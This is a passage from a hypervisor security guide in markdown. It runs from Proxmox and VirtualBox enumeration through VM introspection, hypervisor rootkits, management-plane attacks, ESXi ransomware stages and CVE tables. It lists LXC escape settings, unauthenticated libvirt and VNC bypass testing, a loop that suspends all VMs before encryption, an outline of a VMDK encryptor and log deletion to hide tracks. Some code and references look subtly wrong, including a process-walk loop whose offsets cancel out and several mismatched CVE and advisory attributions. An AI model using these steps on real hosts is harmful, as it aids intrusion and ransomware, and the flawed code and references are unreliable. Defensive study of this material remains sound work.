qm snapshot <vmid> <name> --delete

# Misconfiguration: cloud-init with disabled password, exposed SPICE/VNC
qm config <vmid> | grep -E 'vnc|spice|cloudinit'

# Inspect disk backing files
qm config <vmid> | grep -E 'scsi|virtio|ide|sata'
# Output: virtio0: local:100/vm-100-disk-0.qcow2,format=qcow2
```

### 5.3 LXC Containers via pct

```bash
# pct is the Proxmox VE LXC management CLI
# LXC containers share the Proxmox host kernel (NOT a VM!)
# Container escape from LXC transitions to host, not to hypervisor layer

pct list                        # All containers
pct config <ctid>               # Container config
pct status <ctid>
pct enter <ctid>                # Equivalent to docker exec / nsenter
pct exec <ctid> -- /bin/sh

# Common LXC misconfig (escape vector)
# - privileged: 1 (drops user namespace)
# - nesting: 1 (allows containers-in-container, often used to escape)
# - keyctl: 1 (allows keyring syscalls, enables some LPE exploits)
# - mount: /dev:/dev:rw  (gives access to host devices!)

pct config <ctid> | grep -E 'privileged|nesting|keyctl|features|mountpoint'
```

### 5.4 Proxmox Cluster (Corosync) Audit

```bash
# Proxmox cluster uses Corosync on UDP 5404/5405 + PMXCFS (pmxcfs: config fs)
pvecm status                    # Cluster status and quorum
pvecm nodes                     # All nodes
pvecm expected 1                # Force quorum if cluster split (emergency)

# Corosync configuration
cat /etc/pve/corosync.conf
# Audit for: knet/udp transport, cluster_name, expected_votes

# Defensive: place Corosync on dedicated VLAN, restrict UDP 5404/5405,
# monitor for cluster split (split-brain), keep quorum device offline.
```

---

## 6. VirtualBox / Parallels / Type-2 Attacks

### 6.1 VirtualBox

```bash
# VBoxManage is the CLI for VirtualBox (Type-2 hypervisor on Windows/Linux/macOS)

VBoxManage list vms             # All registered VMs
VBoxManage list runningvms
VBoxManage showvminfo <vm>      # Detailed VM info
VBoxManage showvminfo <vm> --machinereadable
VBoxManage guestproperty enumerate <vm>
VBoxManage guestcontrol exec <vm> --username <user> --password <pw> -- ls /

# VBox internal networking (host-only, NAT)
VBoxManage list hostonlyifs
VBoxManage list natnetworks

# VBox extension pack (historically had many CVEs)
VBoxManage list extpacks
# CVE-2014-6588, CVE-2014-6589, CVE-2014-6590, CVE-2014-6595 (VBox 3.x/4.x)
# CVE-2018-2693 (VBox VRDE - VirtualBox Remote Display Extension)
#   The VRDE server exposes MS-RDP on TCP 3389 (or 3390, etc.)
#   Auth bypass via crafted packet. Disable VRDE unless needed.

# Audit for VRDE on running VMs
for vm in $(VBoxManage list vms | awk -F'[{}]' '{print $2}'); do
    echo "--- $vm ---"
    VBoxManage showvminfo "$vm" | grep -i vrde
done
```

### 6.2 Parallels Desktop (macOS)

```bash
# Parallels Desktop is a Type-2 hypervisor for macOS, popular for x86 Macs
# CLI: prlctl

prlctl list -a                  # All VMs (all states)
prlctl list -a -i               # Detailed info
prlctl exec <vm> <cmd>          # Execute inside guest
prlctl internal <vm> info       # Internal info
prlctl snapshot list <vm>       # Snapshots

# Network mode audit
for vm in $(prlctl list -a | awk 'NR>1{print $1}'); do
    echo "--- $vm ---"
    prlctl list -i "$vm" | grep -E 'shared|host-only|bridged'
done

# CVE history: Parallels has had several local LPE bugs in its helper tools:
# CVE-2020-15265, CVE-2021-31440, etc. Check Parallels release notes.
```

---

## 7. Virtual Machine Introspection (VMI) for Defense and Offense

### 7.1 LibVMI / PyVMI

```bash
# LibVMI is a C library for VM introspection on Xen, KVM/QEMU, and ESXi
# PyVMI is the Python binding

# Install on Debian/Ubuntu
apt-get install libvmi-dev python3-vmi

# Configure a guest for LibVMI (Linux guest)
# 1. Note the guest kernel's System.map (System.map-$(uname -r))
# 2. Extract symbols:
sudo awk '{ if ($2 == "T" || $2 == "D") print $3, $1 }' \
    /boot/System.map-5.15.0-25 > linux_symbols.txt

# 3. Create /etc/libvmi.conf entry:
cat <<EOF | sudo tee -a /etc/libvmi.conf
linux-guest {
    ostype = "Linux";
    sysmap = "/boot/System.map-5.15.0-25";
}
EOF

# 4. Read a kernel symbol from outside the guest
python3 <<'EOF'
import libvmi
vmi = libvmi.VMI("linux-guest")
init_task = vmi.translate_ksym2v("init_task")
print(f"init_task @ {hex(init_task)}")
print(f"Linux boot time: {vmi.get_offset('linux_boot_time')}")
EOF

# Walk the Linux process list from outside the guest
python3 <<'EOF'
import libvmi
vmi = libvmi.VMI("linux-guest")
init_task = vmi.read_addr_ksym("init_task")
tasks_off = vmi.get_offset("linux_tasks")
pid_off = vmi.get_offset("linux_pid")
name_off = vmi.get_offset("linux_name")

cur = init_task
while True:
    cur = vmi.read_addr_va(cur + tasks_off - tasks_off, 0)  # follow next
    pid = vmi.read_32_va(cur + pid_off - tasks_off, 0)
    name = vmi.read_str_va(cur + name_off - tasks_off, 0)
    print(f"PID {pid}: {name}")
    if cur == init_task:
        break
EOF
```

```python
# PyVMI - walk Windows EPROCESS list (out-of-guest)
import libvmi

vmi = libvmi.VMI("win7-guest", initcomplete=False)
vmi.init("win7-guest", init_key={'ostype': 'Windows'})

# Walk PsActiveProcessHead
psapi_head = vmi.translate_ksym2v("PsActiveProcessHead")
active_links_off = vmi.get_offset("win_eprocess_active_link")
pid_off = vmi.get_offset("win_eprocess_pid")
image_off = vmi.get_offset("win_eprocess_name")

cur = vmi.read_addr_va(psapi_head, 0)
while True:
    cur = vmi.read_addr_va(cur, 0)  # _LIST_ENTRY->Flink
    pid = vmi.read_32_va(cur + pid_off - active_links_off, 0)
    name = vmi.read_str_va(cur + image_off - active_links_off, 0, 16)
    print(f"PID {pid}: {name}")
    if cur == psapi_head:
        break
```

### 7.2 DRAKVUF

```bash
# DRAKVUF is a dynamic malware analysis platform built on LibVMI + Xen
# Installs on Debian with Xen 4.x

apt-get install drakvuf

# Set up Xen + a Windows guest (lab)
# 1. Install Debian + Xen
# 2. Create a Windows 7/10 HVM guest via xl
# 3. Take a snapshot of the clean guest
# 4. Extract kernel symbols (Windows)
#    - Take the ntkrnlmp.exe from the guest's C:\Windows\System32\
#    - Run Rekall/Volatility3 banner ID to get build
#    - Build a Rekall profile (JSON) using rekall-1.7.2

# Configure /etc/libvmi.conf for DRAKVUF
cat <<EOF | sudo tee -a /etc/libvmi.conf
win7malware {
    ostype = "Windows";
    rekall_profile = "/root/profiles/win7x64-sp1.json";
}
EOF

# Run a malware sample inside the guest from outside
drakvuf -r /root/profiles/win7x64-sp1.json \
        -d win7malware \
        -e "C:\\malware.exe" \
        -o csv \
        -D /var/log/drakvuf/
# DRAKVUF will:
# - Inject the malware into the guest via process creation trap
# - Log all syscalls, file accesses, registry modifications, network connections
# - The malware cannot detect it (no in-guest instrumentation)

# Common DRAKVUF plugins
drakvuf -d <vm> -a syscalls            # All syscalls
drakvuf -d <vm> -a filetracer          # File operations
drakvuf -d <vm> -a regtracer           # Registry operations
drakvuf -d <vm> -a objmon              # Object create
drakvuf -d <vm> -a exmon               # Exception monitor
drakvuf -d <vm> -a cpuidmon            # CPUID detection (anti-VM)
drakvuf -d <vm> -a ssdtmon             # SSDT modification (rootkit)
drakvuf -d <vm> -a poolmon             # Pool allocations
drakvuf -d <vm> -a socketmon           # Network sockets
```

### 7.3 DECAF

```bash
# DECAF (Dynamic Executable Code Analysis Framework) is a QEMU-based VMI
# Build from source:
git clone https://github.com/sycurelab/DECAF.git
cd DECAF
./configure --target-list=x86_64-softmmu
make -j$(nproc)

# Run with taint enabled
./x86_64-softmmu/qemu-system-x86_64 \
  -m 2048 -hda win7.qcow2 \
  -monitor stdio \
  -load-plugin libdecaf.so \
  -taint

# DECAF supports plugins for: function tracing, API hooking, taint tracking
# Historically the basis for many dynamic malware analysis papers.
```

### 7.4 PANDA

```bash
# PANDA (Platform for Architecture-Neutral Dynamic Analysis) is another QEMU fork
# Built around record/replay and taint analysis

git clone https://github.com/panda-re/panda.git
cd panda
mkdir build && cd build
cmake ..
make -j$(nproc)

# Record a session
./x86_64-softmmu/qemu-system-x86_64 \
  -m 2048 -hda win7.qcow2 \
  -monitor stdio \
  -panda record:file=rec.pandalog

# Replay with a plugin
./x86_64-softmmu/qemu-system-x86_64 \
  -replay rec.pandalog \
  -panda strings \
  -panda-arg strings:maxlen=64

# PANDA plugins: strings, taint2, tainted_branch, asidstory, proc_start_linux,
# syscalls2, osi, osi_linux, osi_w7
```

### 7.5 XenAccess (legacy)

```bash
# XenAccess was the precursor to LibVMI (2007-2010).
# Largely superseded by LibVMI, but still referenced in older VMI literature.
# Use LibVMI for any new VMI work.
```

### 7.6 Hunter / Moneta / HyperPlatform

```bash
# HyperPlatform: thin Intel VT-x hypervisor for Windows (defensive)
# Deploys at runtime, no reboot required
# Source: https://github.com/tandasat/HyperPlatform

# Build with WDK 10, sign with a test cert, then:
sc create HyperPlatform type= kernel binPath= C:\HyperPlatform.sys
sc start HyperPlatform

# DdiMon: HyperPlatform-based driver that monitors specific kernel functions
# Example: monitor MmCopyVirtualMemory (used by Mimikatz for lsass dump)
# Output via DebugView

# Hunter: detects in-memory code injection (process hollowing, etc.) via EPT
# Moneta: detects in-memory anomalies (RWX pages, unbacked executable memory)

# Defensive integration:
# - Deploy on dedicated monitoring VMs only (EPT overhead ~5-10% per guest)
# - Forward alerts to SIEM via ETW or Syslog
# - Use as compensating control when EDR cannot be deployed in guest (e.g., legacy OS)
```

---

## 8. Hypervisor-based Rootkits and Thin Hypervisors

### 8.1 BluePill (AMD64 SVM)

```bash
# BluePill (Joanna Rutkowska, 2006) demonstrated a thin hypervisor on AMD64 SVM
# Concept:
#   1. Malware with ring 0 privileges on the OS
#   2. SVM initialization (EFER.SVME=1, VM_HSAVE_PA set)
#   3. #VMEXIT handler installed
#   4. OS now runs in guest mode; malware runs in host mode
#   5. Memory hiding via NPT (nested page tables) - present different physical page

# Reproduce (lab):
# - Linux kernel module that does SVM init (root required)
# - Reference: https://theinvisiblethings.blogspot.com/2006/06/introducing-bluepill.html
# - Code sample: http://www.invisiblethings.org/bluepill.html (archived)

# Detection (paranoid):
#   - Time in VMRUN vs RDTSC differs (SVM traps RDTSC)
#   - CPUID leaf 0x40000000 returns unexpected vendor
#   - SMBASE / VM_HSAVE_PA non-zero when expected

# Modern variants: BluePill-derived techniques used by
#   - LoJax (APT28 UEFI rootkit)
#   - MoonBounce (APT41 UEFI)
```

### 8.2 SubVirt / Vitriol (Intel VT-x)

```bash
# SubVirt (Sam King et al., 2006) and Vitriol (Intel VT-x variant of BluePill)
# Concept: same as BluePill but using Intel VMX instead of AMD SVM.
# Memory hiding uses EPT (Extended Page Tables).

# Intel VMX root mode primitives:
#   - VMXON: enter VMX root mode (requires IA32_FEATURE_CONTROL lock)
#   - VMPTRLD: load current VMCS
#   - VMLAUNCH: launch guest
#   - VMRESUME: resume guest after #VMEXIT
#   - VMXOFF: exit VMX root mode

# Sample sequence (lab):
#   1. Allocate VMXON region (4KB, aligned)
#   2. Set CR4.VMXE=1
#   3. VMXON [vmxon_phys]
#   4. Allocate VMCS, VMPTRLD
#   5. Set up guest state (CR0/CR3/CR4, GDT/IDT, RIP/RSP)
#   6. VMLAUNCH
#   7. #VMEXIT handler reads exit reason, handles, VMRESUME

# Detection:
#   - Time in VMLAUNCH differs from baseline
#   - INVEPT fails unexpectedly (nested hypervisor)
#   - Unexpected behavior on VMCALL (legitimate hypervisors respond with set return)
#   - CPUID 0x40000000 leaf returns unknown vendor
```

### 8.3 HyperJack

```bash
# HyperJack (2008) is a technique for transferring control of an existing
# hypervisor to a new one (hypervisor-on-hypervisor).
# Used in lab: deploy HyperPlatform on top of an existing Hyper-V
# Windows host (nested virtualization).

# Not directly offensive, but demonstrates that:
# - Multiple hypervisors can coexist
# - Detection of nested hypervisors is non-trivial
# - The "outermost" hypervisor wins (controls everything inside)
```

### 8.4 Modern Malicious Hypervisor Detection

```bash
# Defensive: detect thin hypervisors on a Windows host
# Method 1: RDTSC timing on VMCALL/VMCPUID
#   VMCALL from ring 3 would normally #UD. If a hypervisor catches it,
#   the timing is much longer than a #UD.
# Method 2: CPUID 0x40000000 leaf
#   Legitimate hypervisors (Hyper-V, VMware, KVM) report their signature
#   here. Unexpected value = malicious hypervisor.
# Method 3: Check IA32_FEATURE_CONTROL MSR
#   Bit 0 (lock), bit 2 (VMX outside SMX). Locked + enabled = expected on modern HW.

# Windows (PowerShell, requires admin)
$cpuInfo = Get-CimInstance -ClassName Win32_Processor
$cpuInfo.VirtualizationFirmwareEnabled
$cpuInfo.VMMonitorModeExtensions

# Use rdrand/rdtsc differential to detect EPT hooks
# (HyperPlatform and similar set up EPT hooks on kernel functions)
```

---

## 9. Hardware-assisted Virtualization Abuse

### 9.1 Intel VT-x

```bash
# VT-x provides VMX root mode (hypervisor) and VMX non-root mode (guest)
# Key primitives:
#   - VMCS (Virtual Machine Control Structure): per-VCPU state
#   - EPT (Extended Page Tables): second-level address translation
#   - VPID (Virtual Processor ID): TLB tagging
#   - VMFUNC: light-weight VM switching
#   - posted interrupts: efficient vCPU interrupt delivery

# Check VT-x support
grep -E 'vmx|svm' /proc/cpuinfo | head -1
rdmsr 0x3a    # IA32_FEATURE_CONTROL

# Enable VT-x (BIOS/UEFI):
#   Intel VT-x = "Intel Virtualization Technology" in BIOS
#   VT-d = "Intel VT-d" (IOMMU)
#   EPT = "Intel VT-x Extended Page Tables" (sometimes "Intel VT-x with EPT")

# KVM with VT-x (host kernel):
modprobe kvm-intel
echo 1 > /sys/module/kvm_intel/parameters/nested   # Enable nested

# EPT-based memory hiding (research):
#   - Set up two EPT entries: one presenting the real page, one presenting
#     a decoy page.
#   - Use EPT violation to swap entries based on access type (read vs execute).
#   - Result: a page that reads one thing and executes another.
#   - Used by HyperPlatform-based rootkits (defensive use case: hide EPT hooks).
```

### 9.2 AMD-V / NPT

```bash
# AMD-V (formerly Pacifica) provides SVM (Secure Virtual Machine)
# Key primitives:
#   - VMCB (Virtual Machine Control Block): per-VCPU state
#   - NPT (Nested Page Tables, also RVI): second-level address translation
#   - ASID: address space ID (TLB tagging)
#   - DEV (Device Exclusion Vector): DMA protection
#   - AMD-Vi (IOMMU)

# Check SVM support
grep -E 'svm' /proc/cpuinfo | head -1
rdmsr 0xc0000080    # EFER, bit 12 = SVME

# KVM with AMD-V:
modprobe kvm-amd
echo 1 > /sys/module/kvm_amd/parameters/nested
```

### 9.3 ARM EL2 (Hypervisor Exception Level)

```bash
# ARM virtualization uses EL2 (Exception Level 2) for the hypervisor
# EL1 = guest kernel, EL0 = guest user, EL2 = hypervisor, EL3 = secure monitor
# Key ARM virtualization features:
#   - VHE (Virtual Host Extension): host OS at EL2 (faster, ARMv8.1+)
#   - Stage-2 page tables: equivalent to EPT/NPT
#   - VGIC (Virtual Generic Interrupt Controller)
#   - SMMU (System Memory Management Unit): equivalent to IOMMU

# Check ARM virtualization
# On a Linux ARM host (Apple Silicon with Asahi, RPi 4 with hyp):
dmesg | grep -i kvm
# kvm: ARM Limited errata detected
# kvm: HYP mode not available   -> if so, hyp not initialized

# On Apple Silicon (M1/M2/M3), KVM is not upstream; Asahi Linux has hyp.
# Stage-2 page tables can be used for VMI even without a full guest OS:
# - Hide kernel pages from a debugged process
# - Implement a "red pill" detection for nested EL2

# ARM TrustZone (secure world) is separate from EL2:
# - Secure monitor at EL3 mediates normal <-> secure
# - OVMF / OP-TEE run in secure world
# - TrustZone-based VMI is high-assurance: malware in normal world cannot
#   tamper with VMI agent in secure world.
```

### 9.4 AMD SEV-SNP / Intel TDX (Confidential Computing)

```bash
# Confidential computing: guest memory encrypted with a key the hypervisor
# cannot read.
# AMD SEV (Secure Encrypted Virtualization): VM-based encryption
#   - SEV: per-VM encryption key
#   - SEV-ES: encrypts VM register state on #VMEXIT
#   - SEV-SNP: adds integrity protection and reverse-map table
# Intel TDX (Trust Domain Extensions): VM-based encryption, similar concept
# ARM CCA (Confidential Compute Architecture): Realm-based

# Threat model shift: the hypervisor operator (cloud provider) is the adversary.
# Audit targets:
#   - Firmware/BIOS supports SEV-SNP / TDX
#   - Guest kernel attests the hypervisor at boot
#   - Hypervisor cannot read guest memory (verify via QEMU monitor)

# On a SEV-SNP host:
$ qpdf --show-encryption /sys/class/kvm/amd-sev/launch_measure  # pseudo-command
# Actually use:
virsh domlaunchsev <vm>
virsh domlaunchmeasure <vm>

# On TDX host (Intel):
# Guest: dmesg | grep -i tdx
# Host: ls /sys/devices/system/cpu/tdx

# Attack surface:
#   - Hypervisor bugs that leak the encryption key
#   - Guest bugs that leak the key to the hypervisor
#   - Firmware (OVMF/UEFI) in the measured launch is compromised
#   - Host CPU vulns (e.g., CrossLine, Snoop-assisted L1)
```

---

## 10. VM Memory Forensics

### 10.1 Capturing Guest RAM via Hypervisor Snapshots

```bash
# Method 1: virsh memory dump (KVM/QEMU)
virsh list --all
virsh dump <domain> /tmp/<domain>.dump --memory-only
# Produces an ELF core dump of the guest's memory

# Method 2: QEMU pmemsave via QMP
echo '{"execute":"pmemsave","arguments":{"val":0,"size":2147483648,"filename":"/tmp/guest.dump"}}' | \
    nc -U /var/lib/libvirt/qemu/<domain>.monitor

# Method 3: ESXi snapshot (writes .vmsn file alongside .vmdk)
#   In vSphere Client: Right-click VM -> Snapshots -> Take Snapshot
#   CLI: vim-cmd vmsvc/snapshot.create <vmid> <name> <desc> 0 0
#   The .vmsn file can be parsed by Volatility's vmware plugin.

# Method 4: Hyper-V save (writes .bin and .vsv files)
Save-VM -Name <vm> -Path D:\Saves\<vm>\
# Or via PowerShell:
$vm = Get-VM -Name <vm>
Checkpoint-VM -VM $vm -Name Snapshot1
# RAM is in the .bin file within the snapshot folder.

# Method 5: VMware Workstation/Fusion
#   Suspend the VM. The .vmem file contains the full guest RAM.
#   Path: ~/Virtual Machines/<vm>.vmem
```

### 10.2 Volatility 3 Analysis

```bash
# Volatility 3 is the modern Python 3 version of Volatility
pip3 install volatility3

# Identify the OS and profile
vol -f guest.dump banners
vol -f guest.dump windows.info
vol -f guest.dump linux.bash         # Linux specific

# Common Windows plugins
vol -f guest.dump windows.pslist             # Process list
vol -f guest.dump windows.pstree             # Process tree
vol -f guest.dump windows.psscan             # Scan for hidden processes
vol -f guest.dump windows.netscan            # Network connections
vol -f guest.dump windows.cmdline            # Process command lines
vol -f guest.dump windows.dlllist            # Loaded DLLs per process
vol -f guest.dump windows.handles            # Open handles
vol -f guest.dump windows.malfind            # Suspicious memory regions
vol -f guest.dump windows.modscan            # Kernel modules (hidden)
vol -f guest.dump windows.ssdt               # SSDT (rootkit hook check)
vol -f guest.dump windows.callbacks          # Kernel callbacks
vol -f guest.dump windows.registry.hivelist  # Loaded registry hives
vol -f guest.dump windows.registry.printkey  # Read a registry key
vol -f guest.dump windows.filescan           # File objects
vol -f guest.dump windows.dumpfiles --pid <PID>  # Dump files

# Extract a process's memory
vol -f guest.dump windows.memmap --pid <PID> --dump

# Common Linux plugins
vol -f guest.dump linux.pslist
vol -f guest.dump linux.pstree
vol -f guest.dump linux.bash
vol -f guest.dump linux.check_syscall
vol -f guest.dump linux.proc.Maps
vol -f guest.dump linux.tty_check
```

### 10.3 Hypervisor-level vs Guest-level Forensics

```bash
# Hypervisor-level forensics (VMI-based) advantages:
#   - Cannot be subverted by guest rootkit (VMI runs outside guest)
#   - Doesn't require guest agent installation
#   - Captures raw physical memory layout
# Disadvantages:
#   - Requires hypervisor access (admin on host)
#   - Doesn't capture userland-specific context (need guest-aware VMI)

# Guest-level forensics (agent in guest) advantages:
#   - Rich semantic context (process names, file paths, user names)
#   - Lower latency for incident response
# Disadvantages:
#   - Subverted by guest rootkit (false negatives)
#   - Malware may detect/disable the agent

# Combined approach (VMI + guest agent) is gold standard for high-value VMs:
#   - VMI provides ground truth
#   - Guest agent provides rich context
#   - Cross-validation catches rootkits
```

---

## 11. Management Plane Protocol Abuse

### 11.1 vSphere SOAP API

```bash
# The SOAP API is the legacy vCenter/ESXi API (pre-REST)
# PowerCLI and govc both speak SOAP under the hood
# Endpoint: https://<vc>/sdk/vimService

# Capture SOAP traffic
tcpdump -i any -w vsphere.pcap host <vc> and port 443
tshark -r vsphere.pcap -Y 'http' -V

# Manually invoke a SOAP method
curl -k -X POST https://<vc>/sdk \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: urn:vim25/5.5" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<soap:Body>
<RetrieveServiceContent xmlns="urn:vim25">
  <_this type="ServiceInstance">ServiceInstance</_this>
</RetrieveServiceContent>
</soap:Body>
</soap:Envelope>'

# Defensive: monitor SOAP API for unusual methods (LogonByPrincipal, Acquire*)
# Alert on SSO admin logins from unexpected IPs.
```

### 11.2 libvirt Remote Protocol

```bash
# libvirt exposes a remote protocol on TCP 16509 (read-write) or via SSH (qemu+ssh)
# Often misconfigured: tcp/16509 exposed on guest network

# Test unauthenticated libvirt TCP
virsh -c qemu+tcp://<host>/system list
# If this works, the host has no auth on libvirt - critical

# Test SASL auth (typical)
virsh -c qemu+tcp://<host>/system?auth=sasl list

# SSH tunnel (recommended)
virsh -c qemu+ssh://user@<host>/system list

# Audit libvirt config
cat /etc/libvirt/libvirtd.conf | grep -E 'listen_tcp|auth_tcp|tls_port'
# Defensive settings:
#   listen_tcp = 0   (disable TCP)
#   auth_tcp = "sasl"  (if TCP is enabled)
#   tls_port = "16514"  (use TLS instead of TCP)

# Capture libvirt protocol
tcpdump -i any -w libvirt.pcap port 16509
```

### 11.3 XenServer / XCP-ng API

```bash
# XenServer exposes a JSON-RPC API on TCP 443
# xe CLI speaks this protocol

xe host-list -u root -pw <PW> -h <xenserver>
xe vm-list -u root -pw <PW> -h <xenserver>
xe sr-list -u root -pw <PW> -h <xenserver>

# REST equivalent
curl -k -X GET https://<xs>/rest/v1/hosts \
  -H "Session: <session-token>"
```

### 11.4 SPICE / VNC / RDP Consoles

```bash
# Each VM can expose a graphical console:
#   - VMware: MKS (TCP 902) - proprietary protocol
#   - Hyper-V: VMConnect (local only) / RDP (if enabled in guest)
#   - KVM/QEMU: VNC (TCP 5900+) or SPICE (TCP 5930+, 5931+, ...)
#   - Xen: VNC
#   - Proxmox: VNC/SPICE via noVNC web (TCP 8006, proxied)
#   - VirtualBox: VRDE (TCP 3389+)

# VNC enumeration
nmap -p 5900-5910 <target> --script vnc-info,realvnc-auth-bypass
# RealVNC 4.1.1 - 4.1.3 auth bypass: send a malformed security type
#   curl or python script to inject "Security type: 0x01" before negotiation

# SPICE enumeration
nmap -p 5930-5935 <target> --script ssl-cert,ssl-enum-ciphers

# Test for default/no VNC password (common on Proxmox local networks)
vncviewer <target>::5901 -passwd <empty-or-default>

# Defensive:
#   - Bind VNC/SPICE to 127.0.0.1 only
#   - Require TLS on SPICE
#   - Rotate VNC passwords
#   - Tunnel via SSH (qemu+ssh style)
```

---

## 12. ESXi Ransomware Techniques

### 12.1 Reconnaissance (Pre-Encryption)

```bash
# Stage 1: Identify target ESXi/vCenter via internet-wide scanning (Shodan)
# Search: product:"VMware" port:443
# Search: product:"ESXi" port:8300  (the SOAP hostd)
# Search: port:427 (OpenSLP)

# Stage 2: Credential acquisition
#   - Steal vCenter/ESXi credentials via info-stealer on admin's laptop
#   - Buy on dark web marketplaces
#   - Brute force SSH/HTTPS if exposed

# Stage 3: Validate access
curl -k -X POST https://<target>/api/session \
  -H "Content-Type: application/json" \
  -d '{"username":"root","password":"<PW>"}'
```

### 12.2 Encryption Phase

```bash
# Stage 4: Suspend all VMs to enable disk encryption (vmfs doesn't lock files when VM off)
# Real-world example (simplified - DO NOT RUN in production):

# Iterate VMs via govc
for vm in $(govc vm.info -json | jq -r '.VirtualMachines[].Name'); do
    echo "Suspending $vm..."
    govc vm.power -suspend "$vm"
done

# Stage 5: Encrypt VMDK files (variant of Babuk/Esiqi/BlackCat encryptor)
# The encryptor:
#   - Walks /vmfs/volumes/<datastore>/*.vmdk (skips -flat.vmdk)
#   - Opens each .vmdk file (descriptor)
#   - For each -flat.vmdk: opens, reads chunks, encrypts in place with ChaCha20+RSA
#   - Renames to .vmdk.<ransomware-name>
#   - Writes ransom note /etc/motd and /vmfs/volumes/*/.README.txt

# Stage 6: Cover tracks
#   - Delete /var/log/vmkernel.log
#   - Delete /var/log/hostd.log
#   - Kill SSH session
#   - Some variants (Akira) keep ESXi running so victim can pay via the same network
```

### 12.3 Defensive: ESXiArgs TTPs

```bash
# ESXiArgs (Feb 2023) specific behaviors:
#   - Exploits CVE-2021-21974 (OpenSLP) for initial access
#   - Drops payload to /tmp/, executes via /bin/sh -c
#   - Modifies /etc/rc.local.d/local.sh for persistence (until reboot)
#   - Suspends VMs via vim-cmd vmsvc/power.suspend
#   - Encrypts .vmdk files, renames .vmdk.args
#   - Ransom note: /etc/motd, contains contact + Bitcoin address
#   - Sample size: ~200 bytes per encrypted VM, fast

# IoCs to search:
#   - Files in /tmp/: s*, sv, l, n
#   - /var/tmp/vmware-root/*/sv (the encryptor)
#   - .args extension on .vmdk files
#   - /etc/motd contains "encrypt" or email address

# Defensive commands (post-incident, ESXi shell):
find /vmfs/volumes -name "*.args" -ls
ls -la /tmp/ /var/tmp/
cat /etc/motd
cat /etc/rc.local.d/local.sh
vim-cmd hostsvc/advopt/view Config.HostAgent.plugins.solo.enableMob
```

### 12.4 Akira / Royal / BlackCat TTPs

```bash
# Akira (March 2023+) - targets ESXi and Windows
#   - Initial access: VPN creds stolen via info-stealer (Laplas, RedLine)
#   - Lateral movement to vCenter via SSH/HTTPS
#   - Uses vim-cmd to suspend VMs
#   - Encrypts .vmdk, .vmx, .vmsn, .lck files
#   - Renames to .akira
#   - Leak site: akira.onion (Tor)

# Royal (2022-2023) - similar TTPs, .royal extension
# BlackCat/ALPHV (2021+) - Rust-based, .blackcat extension
# Play (2022+) - .play extension, often disables ESXi services
# Vice Society - .encrypted

# Common MITRE ATT&CK techniques:
#   T1190 - Exploit Public-Facing Application (OpenSLP, etc.)
#   T1078 - Valid Accounts (stolen VPN creds)
#   T1486 - Data Encrypted for Impact
#   T1562 - Impair Defenses (kill vmware-tools)
#   T1490 - Inhibit System Recovery (delete .vmsn)
```

---

## Appendix A: CVE Reference Index

### VMware ESXi / vCenter

| CVE | Component | CVSS | Vector | Patched In |
|-----|-----------|------|--------|------------|
| CVE-2019-5544 | OpenSLP | 9.8 | Remote unauth heap overflow | ESXi 6.7 U3 |
| CVE-2020-3992 | OpenSLP | 9.8 | Use-after-free | ESXi 7.0 U2c |
| CVE-2020-4004 | vCenter plugin | 9.1 | Local auth bypass | vCenter 7.0 U1c |
| CVE-2020-4005 | vCenter rproxy | 7.5 | DoS | vCenter 7.0 U1c |
| CVE-2021-21974 | OpenSLP | 9.8 | Heap overflow (ESXiArgs) | ESXi 7.0 U2c |
| CVE-2021-22005 | vCenter analytics | 9.8 | Log upload RCE | vCenter 7.0 U2a |
| CVE-2021-22019 | vSphere Client | 7.8 | File upload | vCenter 7.0 U2b |
| CVE-2022-31656 | vCenter SSO | 9.8 | Auth bypass | vCenter 7.0 U3g |

### QEMU / KVM

| CVE | Component | CVSS | Vector | Patched In |
|-----|-----------|------|--------|------------|
| CVE-2015-3456 | Floppy (VENOM) | 9.3 | Buffer overflow | QEMU 2.3.1 |
| CVE-2015-7504 | PCNET | 7.4 | Heap overflow | QEMU 2.4.0 |
| CVE-2015-7512 | PCNET | 7.4 | Negative-length read | QEMU 2.5.0 |
| CVE-2016-2392 | usb-net | 7.7 | Heap overflow | QEMU 2.5.0 |
| CVE-2017-5898 | usb-redir | 7.1 | Heap overflow | QEMU 2.8.0 |
| CVE-2020-14364 | USB XHCI | 8.5 | Out-of-bounds read | QEMU 5.1.1 |
| CVE-2020-15863 | e1000e | 8.5 | XDP packet OOB | QEMU 5.1.1 |
| CVE-2021-3947 | e1000e | 7.0 | Out-of-bounds write | QEMU 6.0.0 |
| CVE-2021-20221 | vhost-user-gpu | 6.5 | OOB read | QEMU 6.0.0 |
| CVE-2023-3354 | jobs | 7.0 | Heap overflow | QEMU 8.0.0 |

### Xen (XSA)

| XSA | CVE | Component | Vector |
|-----|-----|-----------|--------|
| XSA-148 | CVE-2015-7812 | PV guest | Privilege escalation via MMIO |
| XSA-155 | CVE-2015-3456 | QEMU floppy | Same as VENOM |
| XSA-182 | CVE-2016-6258 | PV guest | Invalid pointer |
| XSA-242 | CVE-2017-12137 | PV block | Grant table issue |
| XSA-253 | CVE-2017-15592 | PV guest | Pagetable update |
| XSA-289 | CVE-2018-15469 | HVM guest | PIT state DoS |
| XSA-345 | CVE-2020-29479 | ARM guest | Cache flush DoS |
| XSA-390 | CVE-2021-28692 | PV guest | devicePassthrough |
| XSA-392 | CVE-2021-28693 | x86 IOMMU | Page-table entry |
| XSA-417 | CVE-2022-26362 | PV guest | Grant table race |
| XSA-419 | CVE-2022-26365 | PVH guest | Hypervisor escape |
| XSA-424 | CVE-2022-33745 | HVM guest | Mapping leak |

### Hyper-V

| CVE | Component | Vector |
|-----|-----------|--------|
| CVE-2017-0180 | vmbus.sys | Buffer overflow (MS17-0113) |
| CVE-2018-8439 | vmbus.sys | DoS |
| CVE-2019-0628 | vmbus.sys | Info disclosure |
| CVE-2019-0719 | vmbus.sys | DoS |
| CVE-2020-0663 | vmbus.sys | RCE |
| CVE-2021-28472 | vmbus.sys | RCE |
| CVE-2022-21904 | vmbus.sys | Info disclosure |
| CVE-2023-21558 | vmbus.sys | RCE |

---

## Appendix B: Lab Setup Quick Reference

### Nested ESXi on VMware Workstation/Fusion

```bash
# Host requirements: VMware Workstation Pro 16+ or Fusion Pro 12+
# On host BIOS: enable Intel VT-x and VT-x EPT

# 1. Create a VM with hardware version 17+
# 2. Edit .vmx file, add:
vhv.enable = "TRUE"
